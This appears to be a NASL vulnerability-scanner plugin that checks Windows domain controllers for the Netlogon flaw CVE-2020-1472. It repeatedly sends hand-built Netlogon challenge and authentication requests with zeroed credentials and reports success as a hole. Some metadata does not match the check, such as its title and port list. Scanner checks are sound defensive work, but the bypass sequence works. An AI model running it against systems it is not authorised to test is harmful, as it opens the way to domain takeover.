############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY
############################################################
include("compat.inc");

if (description)
{
  script_id(51799290);
  script_version("1.3");
  script_cve_id("CVE-2020-1472");
  script_set_attribute(attribute:"plugin_modification_date", value:"2020/08/20");

  script_name(english:"DCE Services Enumeration");
  script_summary(english:"Enumerates the remote DCE services");

  script_set_attribute(attribute:"synopsis", value:"The remote Windows host is affected by multiple vulnerabilities.");
  script_set_attribute(attribute:"description", value:"An elevation of privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller, using the Netlogon Remote Protocol (MS-NRPC), aka 'Netlogon Elevation of Privilege Vulnerability'.");
  script_set_attribute(attribute:"solution", value:"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472");
  script_set_attribute(attribute:"risk_factor", value:"High");

  script_set_attribute(attribute:"plugin_publication_date", value:"2020/08/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"asset_inventory", value:"True");
  script_set_attribute(attribute:"os_identification", value:"True");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005-2020 and is owned by Webray, Inc.");
  script_family(english:"Windows");

  script_dependencies("cifs445.nasl",netbios_name_get.nasl);
  script_require_keys("SMB/name");
  script_require_ports(135, 139, 445, "/tmp/settings");
  exit (0);
}


include ("global_settings.inc");
include ("smb_func.inc");
include ("dump.inc");
include ("misc_func.inc");

rawtcp = FALSE;
fid = NULL;

port = 135;

cid = 1;


function rpc_recv (socket)
{
 local_var header, body, len;

 header = recv (socket:socket, length:24, min:24);
 if (strlen(header) != 24)
   return NULL;

 len = get_word (blob:header, pos:8) - 24;
 body = recv (socket:socket, length:len, min:len);

 if (strlen(body) != len)
   return NULL;

 return header + body;
}

function get_padd(b_name){
	for(j=0 ;j<strlen(bios_name);j++){
		pc_name = hexstr((substr(bios_name,j,j)));
		padd += pc_name+"00"; 
	}
	return padd;
}


if ( !get_kb_item("Host/scanned") || get_port_state(port) ){
	for(i=0; i<2000; i++){
		soc = open_sock_tcp (port);
		if(soc)
		{
			ret = dce_rpc_bind(cid:cid, uuid:"e1af8308-5d1f-11c9-91a4-08002b14a0fa", vers:3);
			send (socket:soc, data:ret);
			resp = rpc_recv (socket:soc);
			if(resp)
			{
				data = raw_string(
					0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
					0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
					0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 
					0x4b, 0x00, 0x00, 0x00, 0x4b, 0x00, 0x00, 0x00, 
					0x05, 0x00, 0x13, 0x00, 0x0d, 0x78, 0x56, 0x34, 
					0x12, 0x34, 0x12, 0xcd, 0xab, 0xef, 0x00, 0x01, 
					0x23, 0x45, 0x67, 0xcf, 0xfb, 0x01, 0x00, 0x02, 
					0x00, 0x00, 0x00, 0x13, 0x00, 0x0d, 0x04, 0x5d, 
					0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 
					0x08, 0x00, 0x2b, 0x10, 0x48, 0x60, 0x02, 0x00, 
					0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x0b, 0x02, 
					0x00, 0x00, 0x00, 0x01, 0x00, 0x07, 0x02, 0x00, 
					0x00, 0x00, 0x01, 0x00, 0x09, 0x04, 0x00, 0x00, 
					0x00, 0x00, 0x00, 0xab, 0x00, 0x00, 0x00, 0x00, 
					0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
					0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
					0x01, 0x00, 0x00, 0x00);

				ret = dce_rpc_request (code:0x03, data:data);
				send (socket:soc, data:ret);
				resp = rpc_recv (socket:soc);
				resp = eregmatch(pattern:"045d888a.*", string:hexstr(resp), icase:TRUE);
				send_port = getword(blob:(substr(hex2raw(s:resp[0]),34,35)));
				close(soc);
			}
		}


        soc = open_sock_tcp (send_port);
		if (soc)
		{
			ret = dce_rpc_bind(cid:cid, uuid:"12345678-1234-abcd-ef00-01234567cffb", vers:1);
			send (socket:soc, data:ret);
            rpc_recv (socket:soc);
			bios_name = get_kb_item("SMB/name");
			c1 = str_replace(find:"00",replace:"",string:int2hex(strlen("\\"+bios_name+"1")));
			c2 = str_replace(find:"00",replace:"",string:int2hex(strlen(bios_name+"1"+"$")));
			c3 = str_replace(find:"00",replace:"",string:int2hex(strlen(bios_name+"1")));
			padd = get_padd(b_name:bios_name);
			
			datas = "0f9c0000"+c1+"00000000000000"+c1+"0000005c005c00"+padd+"0000abab"+c3+"00000000000000"+c3+"000000"+padd+"00000000000000000000";
			data = hex2raw(s:datas);
			ret = dce_rpc_request (code:0x04, data:data, id:1);
			send (socket:soc, data:ret);
            rpc_recv (socket:soc);

			send_data = "32c20000"+c1+"00000000000000"+c1+"0000005c005c00"+padd+"0000abab"+c2+"00000000000000"+c2+"000000"+padd+"240000000600abab"+c3+"00000000000000"+c3+"000000"+padd+"00000000000000000000bfbfffff2f21";
			data = hex2raw(s:send_data);
			ret = dce_rpc_request (code:0x1A, data:data,id:2);
			send (socket:soc, data:ret);
            padd = "";
            resps = rpc_recv (socket:soc);
            resp = eregmatch(pattern:"ffff2f21.*", string:hexstr(resps), icase:TRUE);
            if("220000c0" >!< resp[0]){
                security_hole(port:port, data:hexdump(ddata:resps));
			    close(soc);
                exit(0);
			}
                        
			close(soc);


		}
	}
exit(0);
}
